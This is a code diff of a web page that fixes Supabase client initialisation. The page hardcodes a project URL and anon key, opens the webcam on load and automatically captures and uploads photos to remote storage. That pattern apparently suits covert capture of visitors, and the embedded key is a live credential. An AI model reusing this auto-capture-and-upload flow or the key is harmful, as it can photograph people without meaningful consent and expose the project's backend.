@@ -9,30 +9,37 @@
     <video id="video" autoplay></video>
     <p id="status"></p>
 
-    <!-- Correct Supabase Library -->
+    <!-- Load Supabase Library -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.0.5"></script>
     <script>
-        let supabase;
-
-        // Initialize Supabase inside a script that runs after loading the library
         document.addEventListener("DOMContentLoaded", () => {
-            // Supabase initialization
-            const SUPABASE_URL = 'https://xsibckeasnitdilcdzoe.supabase.co';
-            const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhzaWJja2Vhc25pdGRpbGNkem9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzc0ODczODEsImV4cCI6MjA1MzA2MzM4MX0.lv5XOKY3vBL94y4hksOshDexrBwsuynHEzTrgn06diE';
-            supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+            try {
+                // Ensure Supabase library is loaded before initialization
+                if (!window.supabase) {
+                    throw new Error("Supabase library failed to load. Please check the script URL.");
+                }
 
-            // Access camera and start capturing photos
-            setupCamera();
+                // Initialize Supabase
+                const SUPABASE_URL = 'https://xsibckeasnitdilcdzoe.supabase.co';
+                const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhzaWJja2Vhc25pdGRpbGNkem9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzc0ODczODEsImV4cCI6MjA1MzA2MzM4MX0.lv5XOKY3vBL94y4hksOshDexrBwsuynHEzTrgn06diE';
+                const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+                // Start Camera Functionality
+                setupCamera(supabase);
+            } catch (error) {
+                console.error(error.message);
+                document.getElementById('status').innerText = 'Failed to initialize Supabase!';
+            }
         });
 
-        function setupCamera() {
+        function setupCamera(supabase) {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then((stream) => {
                     const video = document.getElementById('video');
                     video.srcObject = stream;
 
                     video.addEventListener('loadeddata', () => {
-                        captureAndUploadPhotos(video);
+                        captureAndUploadPhotos(video, supabase);
                     });
                 })
                 .catch((err) => {
@@ -41,7 +48,7 @@
                 });
         }
 
-        async function captureAndUploadPhotos(video) {
+        async function captureAndUploadPhotos(video, supabase) {
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
 
